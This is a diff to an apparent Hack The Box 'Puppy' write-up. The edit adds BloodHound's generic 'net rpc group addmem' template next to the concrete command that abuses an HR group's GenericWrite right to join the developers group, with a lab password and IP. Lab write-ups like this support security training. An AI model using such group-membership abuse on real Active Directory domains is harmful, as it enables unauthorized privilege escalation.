@@ -178,7 +178,11 @@ Here we can see that the user given to us is member of 2 groups one is a common 
 `Domain Users` and other one is `HR` which is interesting lets check the HR group.
 ![[Puppy02.png]]
 `HR` group has GenericWrite privilege on the `DEVS` group which means we can add our user into the DEVS group lets try doing that since we found the smb share for dev group we might be able to access it after that.
-So the given command in linux abuse side of bloodhound is of net rpc which
+So the given command in linux abuse side of bloodhound is of net rpc 
+```bash
+net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
+```
+So our final 
 ```bash
 net rpc group addmem "DEVELOPERS" "levi.james" -U "puppy.htb"/"levi.james"%"KingofAkron2025!" -S 10.10.11.70
 ```
